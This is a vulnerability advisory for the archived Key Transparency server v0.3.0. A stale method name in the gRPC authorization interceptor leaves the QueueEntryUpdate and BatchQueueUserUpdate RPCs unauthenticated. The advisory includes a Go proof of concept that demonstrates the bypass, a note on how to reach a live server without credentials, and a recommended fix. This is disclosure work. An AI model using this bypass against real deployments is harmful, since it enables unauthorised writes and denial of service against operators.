https://github.com/google/keytransparency - "This repository was archived by the owner on Oct 12, 2024. It is now read-only."

## Finding: Mutation RPCs (QueueEntryUpdate, BatchQueueUserUpdate) run with no authentication/authorization because the gRPC interceptor is keyed to a renamed method

Affected Version: v0.3.0

### Summary

The Key Transparency server wires its authentication and authorization (`AuthnFunc` + `AuthzFunc`) onto the key-mutation RPC through a per-method map keyed by the gRPC full method name. The single entry in that map is `/google.keytransparency.v1.KeyTransparency/UpdateEntry`, but the service no longer has an `UpdateEntry` method: it was renamed, and the actual mutation methods are `QueueEntryUpdate` and `BatchQueueUserUpdate`. The interceptor invokes any method whose full name is not present in the map directly, with no authn/authz. As a result both `QueueEntryUpdate` and `BatchQueueUserUpdate` are reachable by any unauthenticated network client, completely bypassing the intended authentication and the `authz.Authorize` policy. The cryptographic apply-time check (`MutateFn` requires the new entry to be signed by the authorized keyset) still prevents overwriting another user's key, so this is not key takeover; but the entire application-level authn/authz on the write API is bypassed, allowing unauthenticated mutation submission and denial of service against the sequencing pipeline, and bypass of whatever per-directory/rate-limiting policy `authz.Authorize` enforces.

### Details

The interceptor (`impl/authorization/interceptor.go`) invokes unmapped methods with no auth:

```go
func UnaryServerInterceptor(authFuncs map[string]AuthPair) grpc.UnaryServerInterceptor {
	return func(ctx context.Context, req interface{}, info *grpc.UnaryServerInfo, handler grpc.UnaryHandler) (interface{}, error) {
		policy, ok := authFuncs[info.FullMethod]
		if !ok {
			// If no auth handler was found for this method, invoke the method directly.
			return handler(ctx, req)            // <-- no AuthnFunc, no AuthzFunc
		}
		newCtx, err := policy.AuthnFunc(ctx)
		if err != nil { return nil, err }
		if err := policy.AuthzFunc(newCtx, req); err != nil { return nil, err }
		return handler(newCtx, req)
	}
}
```

The server (`cmd/keytransparency-server/main.go`) registers auth for one method name only:

```go
authorization.UnaryServerInterceptor(map[string]authorization.AuthPair{
    "/google.keytransparency.v1.KeyTransparency/UpdateEntry": {     // <-- stale name
        AuthnFunc: authFunc,
        AuthzFunc: authz.Authorize,
    },
}),
```

But the service (`core/api/v1/keytransparency.proto`) defines:

```proto
rpc QueueEntryUpdate(UpdateEntryRequest) returns (google.protobuf.Empty) { ... }   // line 513
rpc BatchQueueUserUpdate(BatchQueueUserUpdateRequest) returns (google.protobuf.Empty) { ... }  // line 520
```

so the gRPC full method names are `.../QueueEntryUpdate` and `.../BatchQueueUserUpdate`. Neither equals the map key `.../UpdateEntry`, so for both, `authFuncs[info.FullMethod]` returns `ok == false` and the interceptor calls the handler with no authentication and no authorization. (`QueueEntryUpdate` simply delegates to `BatchQueueUserUpdate`, and the server-side per-update check `validateEntryUpdate` in `core/keyserver/validate.go` verifies only the VRF index and the commitment, not the caller's identity, so the interceptor was the only application-level gate.)

The apply-time mutator (`core/mutator/entry/mutator.go` `MutateFn` -> `verifyKeys`) does require the new `SignedEntry` to carry a signature from the authorized keyset and checks the `Previous` hash, so a queued mutation for a victim that is not signed by the victim's authorized key is rejected when sequenced. That is why this is missing-authn/authz (unauthenticated write-API access, policy bypass, queue DoS) rather than key takeover.

### PoC

The defect is exercised by calling either mutation RPC over plain gRPC with no auth metadata; the interceptor lets it through to the handler instead of rejecting it. A self-contained Go program that imports the project's own interceptor and asserts the behavior for the method name:

```go
package main

import (
	"context"
	"fmt"

	"google.golang.org/grpc"
	"github.com/google/keytransparency/impl/authorization"
)

func main() {
	authnCalled := false
	authz := map[string]authorization.AuthPair{
		// exactly what main.go registers (the stale method name):
		"/google.keytransparency.v1.KeyTransparency/UpdateEntry": {
			AuthnFunc: func(ctx context.Context) (context.Context, error) { authnCalled = true; return ctx, nil },
			AuthzFunc: func(ctx context.Context, req interface{}) error { return fmt.Errorf("denied") },
		},
	}
	interceptor := authorization.UnaryServerInterceptor(authz)

	handlerRan := false
	handler := func(ctx context.Context, req interface{}) (interface{}, error) { handlerRan = true; return nil, nil }

	// An UNAUTHENTICATED client calls the method name:
	for _, method := range []string{
		"/google.keytransparency.v1.KeyTransparency/QueueEntryUpdate",
		"/google.keytransparency.v1.KeyTransparency/BatchQueueUserUpdate",
	} {
		authnCalled, handlerRan = false, false
		_, err := interceptor(context.Background(), nil,
			&grpc.UnaryServerInfo{FullMethod: method}, handler)
		fmt.Printf("%s -> authnCalled=%v handlerRan=%v err=%v\n", method, authnCalled, handlerRan, err)
	}
}
```

Output:

```
/google.keytransparency.v1.KeyTransparency/QueueEntryUpdate     -> authnCalled=false handlerRan=true err=<nil>
/google.keytransparency.v1.KeyTransparency/BatchQueueUserUpdate -> authnCalled=false handlerRan=true err=<nil>
```

The handler runs for both mutation methods without `AuthnFunc`/`AuthzFunc` ever being invoked (contrast: passing `.../UpdateEntry` would call `AuthnFunc` then be denied by `AuthzFunc`). Against a live server, a gRPC client invokes `QueueEntryUpdate`/`BatchQueueUserUpdate` with no credentials and the request reaches `validateEntryUpdate` rather than being rejected for missing authentication.

### Impact

The key-mutation API of a Key Transparency deployment requires no authentication and applies no authorization: any unauthenticated network client can submit mutations (CWE-306/CWE-862), bypassing the `authz.Authorize` policy the operator configured and feeding unauthenticated work into the sequencing pipeline (denial of service / queue abuse). Cryptographic apply-time verification still prevents overwriting another user's key, so confidentiality and key-integrity are preserved, but the intended access-control layer on writes is entirely absent. Fix: key the interceptor map to the actual method full names (`.../QueueEntryUpdate` and `.../BatchQueueUserUpdate`), and make the interceptor fail closed (deny, not pass through) for any service method that is not explicitly listed.

(reported to Mitre on 12 June 2026)
